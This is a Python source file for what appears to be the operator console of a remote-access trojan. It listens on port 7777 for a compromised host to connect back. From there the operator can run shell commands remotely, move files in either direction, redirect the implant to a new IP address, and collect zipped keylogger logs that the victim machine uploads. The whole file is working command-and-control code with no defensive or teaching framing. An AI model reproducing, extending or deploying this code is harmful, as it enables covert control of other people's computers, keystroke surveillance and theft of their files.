__author__ = "Nick Alexander"
__version__ = "March 27, 2015"

import socket
from os import getcwd, mkdir, system as call
from os.path import exists
from platform import system
from time import sleep

BUFFER_SIZE = 512 * 1024


def tcp_connect(connecting_tcp_socket):
    """
    Used to listen and accept a connection with a TCP socket. Returns a socket used to reply, the remote IP
    and the remote Port.

    :param connecting_tcp_socket: The TCP Socket being used to connect
    :return: A socket used to reply to the remote host, the remote IP address, and the remote port
    """
    try:
        connecting_tcp_socket.listen(1)
        reply_socket, address = connecting_tcp_socket.accept()
        print("Connection from " + address[0] + " on Port " + str(address[1]))
        reply_ip = address[0]
        reply_port = address[1]
        return reply_socket, reply_ip, reply_port
    except Exception as e:
        print(e)
        print("TCP Listen Interrupted. Exiting.")
        exit()


def handle_keylog_transfer(reply_str, sender_socket):
    _, reply = reply_str.split(": ")
    file_path, file_name, file_size = reply.split(" | ")
    file_size = file_size.replace(" bytes", "")
    file_bytes = sender_socket.recv(BUFFER_SIZE)
    print("Expected: " + file_size + " bytes | Found: " + str(len(file_bytes)) + " bytes")
    save_path = save_log_file(file_name, file_bytes)
    print("Log Saved to " + save_path + "\n")


def save_log_file(save_file_name, save_file_bytes):
    """
    Saves the log files sent by the remote host keylogger. The logs are saved in a folder called "Logs" in the same
    directory as this script.

    :param save_file_name: Log file name
    :param save_file_bytes: Log file bytes
    :return: The path to the saved log file
    """
    cwd = getcwd() # Gets Current Working Directory
    log_dir = cwd + "/" + "Logs"
    if not exists(log_dir):
        mkdir(log_dir)
    log_file_path = log_dir + "/" + save_file_name + ".zip"
    with open(log_file_path, "wb") as f:
        f.write(save_file_bytes)
    return log_file_path


def read_file_bytes(read_file_path):
    """
    Reads the file specified in as bytes.

    :param read_file_path: Path to file to read
    :return: Bytes of the file
    """
    file_string = ""
    with open(read_file_path, "r") as f:
        for line in f:
            file_string += line
    return bytes(file_string, "UTF-8")


def give_local_file(connected_socket, ip, port):
    """
    Sends a local file to the remote host.

    :param connected_socket: Socket used to communicate with the remote host
    :param ip: IP address of the remote host
    :param port: Port number of the remote host
    """
    try:
        connected_socket.sendto(bytes("give", "UTF-8"), (ip, port))
        local_path = input("Path to Local File to Give: ")
        file = open(local_path, "rb") # Open a file in byte mode
        file_bytes = file.read() # Read all bytes
        file.close()
        remote_path = input("Path to Remote Destination: ")
        give_message = remote_path + " | " + str(len(file_bytes))
        connected_socket.sendto(bytes(give_message, "UTF-8"), (ip, port))
        sleep(0.5) # Wait so the remote host has time to process and reply
        connected_socket.sendto(file_bytes, (ip, port))
        sleep(0.5) # Wait so the remote host has time to process and reply
        status_message = connected_socket.recv(BUFFER_SIZE)
        print(status_message.decode("UTF-8"))
    except FileNotFoundError:
        print("Error: Local File Not Found")
        connected_socket.sendto(bytes("ERROR", "UTF-8"), (ip, port))


def get_remote_file(connected_socket, ip, port):
    """
    Receives a file from the remote host.

    :param connected_socket: Socket used to communicate with the remote host
    :param ip: IP address of the remote host
    :param port: Port number of the remote host
    """
    connected_socket.sendto(bytes("get", "UTF-8"), (ip, port))
    remote_path = input("Path to Remote File to Get: ")
    connected_socket.sendto(bytes(remote_path, "UTF-8"), (ip, port))
    status_message_bytes = connected_socket.recv(BUFFER_SIZE)
    status_message = status_message_bytes.decode("UTF-8")
    if "Error" not in status_message:
        file_bytes = bytes()
        loop = True
        while loop: # Reads until all bytes of the file have been received
            try:
                file_bytes += connected_socket.recv(BUFFER_SIZE)
            except socket.timeout: # Time out shows that no more data exists in the socket buffer
                loop = False
        print("Expected: " + status_message + " bytes | Found: " + str(len(file_bytes)))
        local_path = input("Path to Local Destination: ")
        try:
            with open(local_path, "wb") as file:
                file.write(file_bytes)
            print("File Saved to " + local_path)
        except Exception as e:
            print(e)
    else:
        print(status_message)


def change_ip(sender_socket, ip, port):
    """
    Changes the IP address to which the remote host attempts to connect.

    :param sender_socket: Socket used to communicate with the remote host
    :param ip: IP address of the remote host
    :param port: Port number of the remote host
    :return: True if the IP address changed successfully
    """
    sender_socket.sendto(bytes("change ip", "UTF-8"), (ip, port))
    new_ip_str = input("New Host IP Address: ")
    sender_socket.sendto(bytes(new_ip_str, "UTF-8"), (ip, port))
    sleep(0.5)
    status = sender_socket.recv(BUFFER_SIZE)
    status_message = status.decode("UTF-8")
    if "IP Address Successfully Changed" in status_message:
        print(status_message)
        return True
    else:
        print(status_message)
        return False


def run_command(command, sender_socket, ip, port):
    """
    Sends a command to the remote host for execution.

    :param command: Command to be sent as string
    :param sender_socket: Socket used to communicate with remote host
    :param ip: IP address of the remote host
    :param port: Port number of the remote host
    """
    command_bytes = bytes(command, "UTF-8")
    sender_socket.sendto(command_bytes, (ip, port))
    has_data = True
    while has_data:
        try:
            byte_reply = sender_socket.recv(BUFFER_SIZE)
            str_reply = byte_reply.decode("UTF-8")
            print(str_reply)
            if "|-- Transfer " in str_reply:
                handle_keylog_transfer(str_reply, sender_socket)
        except socket.timeout:
            has_data = False


def display_help():
    """
    Displays help dialog
    """
    print("Enter a command to be executed on the remote shell.")
    print("Or use one of the following predefined commands:")
    print("\texit\t:\tShuts down the remote host executable and this program")
    print("\tclear\t:\tClears the console")
    print("\thelp\t:\tDisplays this help dialog")
    print("\tip\t:\tDisplays the remote host IP address")
    print("\tchip\t:\tChanges remote connection IP address")
    print("\tport\t:\tDisplays the remote host port number")
    print("\tgive\t:\tTransfers a local file to the remote host")
    print("\tget\t:\tTransfer a remote file to the local host")


def clear():
    """
    Clears the console according to operating system specific command
    """
    if "Windows" in system():
        call("cls")
    else:
        call("clear")


def main():
    """
    Main execution loop
    """
    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    my_port = 7777
    try:
        tcp_socket.bind(('', my_port))
    except OSError as e:
        if "Errno 48" in e.strerror:
            print("Socket already bound. Try again in a few seconds.")
            print(e.strerror)

    s, ip, port = tcp_connect(tcp_socket)

    s.settimeout(1)
    should_stop = False

    while not should_stop:
        command_str = input("command> ")

        if command_str == "exit":
            s.sendto(bytes("exit", "UTF-8"), (ip, port))
            should_stop = True

        elif command_str == "clear":
            clear()

        elif command_str == "help":
            display_help()

        elif command_str == "ip":
            print(ip)

        elif command_str == "port":
            print(port)

        elif command_str == "chip":
            should_stop = change_ip(s, ip, port)

        elif command_str == "give":
            give_local_file(s, ip, port)

        elif command_str == "get":
            get_remote_file(s, ip, port)

        else:
            if not should_stop:
                run_command(command_str, s, ip, port)

    s.close()
    tcp_socket.close()

main() # Entry Point